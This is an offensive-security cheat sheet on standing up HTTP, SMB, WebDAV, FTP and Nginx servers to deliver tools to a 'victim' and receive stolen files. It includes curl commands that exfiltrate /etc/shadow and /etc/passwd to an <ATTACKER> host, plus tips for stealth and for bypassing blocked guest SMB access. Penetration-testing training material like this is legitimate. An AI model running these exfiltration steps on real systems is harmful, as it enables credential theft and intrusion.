# Hosting & Exfiltration Servers
**Concept:** You need a way to serve tools _to_ the victim and receive data _from_ the victim. 
**Key Insight:** Different environments allow different protocols. If SMB is blocked, use HTTP. If HTTP GET is monitored, use HTTPS PUT.
## 1. Python HTTP Servers (The Standard)
**Use Case:** Quick, temporary file hosting. **Install (Upload Server):** `pip3 install uploadserver`
### Basic Download Server
**Goal:** Serve files to the victim.
```shell
# Python 3 (Standard)
sudo python3 -m http.server 80

# Python 2 (Legacy)
sudo python2 -m SimpleHTTPServer 80
```
### Upload Server (Receive Files)
**Goal:** Allow the victim to POST files to you.
```shell
# Start Server (HTTP)
# Listens on Port 8000 by default.
python3 -m uploadserver

# Start Server (HTTPS - Stealthier)
# 1. Generate Self-Signed Cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# 2. Start SSL Server
# usage: curl -X POST https://<ATTACKER>/upload -F 'files=@/etc/shadow' -k
python3 -m uploadserver 443 --server-certificate server.pem
```
## 2. SMB Server (Impacket)
**Use Case:** Windows targets. Allows you to map a drive or copy files via UNC paths (`\\attacker\share`). 
**Note:** Modern Windows versions often block unauthenticated (Guest) SMB access. Use the authenticated version if the basic one fails.
```shell
# Anonymous Share
# Share Name: 'share' | Path: Current Directory (.)
sudo impacket-smbserver share . -smb2support

# Authenticated Share (Bypass "Guest Access Disabled")
# You can use any username/password.
sudo impacket-smbserver share . -smb2support -username test -password test
```
## 3. WebDAV Server (Python)
**Use Case:** When SMB is blocked but HTTP is allowed. Windows can mount WebDAV as a drive letter, bypassing some SMB restrictions. 
**Install:** `pip3 install wsgidav cheroot`
```shell
# Start WebDAV on Port 80
# Root=/tmp means files will be served/saved in /tmp
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
## 4. FTP Server (Python)
**Use Case:** Legacy systems or printers that support FTP upload/download. 
**Install:** `pip3 install pyftpdlib`
```shell
# Start FTP Server on Port 21
# --write: Allows anonymous clients to upload files
sudo python3 -m pyftpdlib --port 21 --write
```
## 5. Nginx (Robust Exfiltration)
**Use Case:** A stable, high-performance server configured to accept file uploads via `HTTP PUT`. This is better for long-term operations than Python scripts.
### Step 1: Configuration (Attacker)
**Goal:** Create a writeable directory and configure Nginx.
```shell
# 1. Create Upload Directory
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# 2. Set Permissions (Critical)
# 'www-data' is the Nginx user. It needs write access.
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# 3. Create Config File
# File: /etc/nginx/sites-available/upload.conf
sudo nano /etc/nginx/sites-available/upload.conf
```

**Config Content:**
```json
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
### Step 2: Enable & Start
```shell
# 1. Enable Site (Symlink)
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# 2. Remove Default (Avoid Port 80 conflicts if needed)
sudo rm /etc/nginx/sites-enabled/default

# 3. Restart Nginx
sudo systemctl restart nginx
```
### Step 3: Client Execution (Victim)
**Goal:** Exfiltrate `/etc/passwd`.
```shell
# Upload via PUT
curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/passwd.txt
```
### Troubleshooting
- **Error:** `bind() to 0.0.0.0:80 failed` -> Something else is using port 80 (Apache? Python?). Use `ss -lnpt | grep 80` to find it.
- **Error:** `403 Forbidden` -> Check `chown www-data` permissions on the upload folder.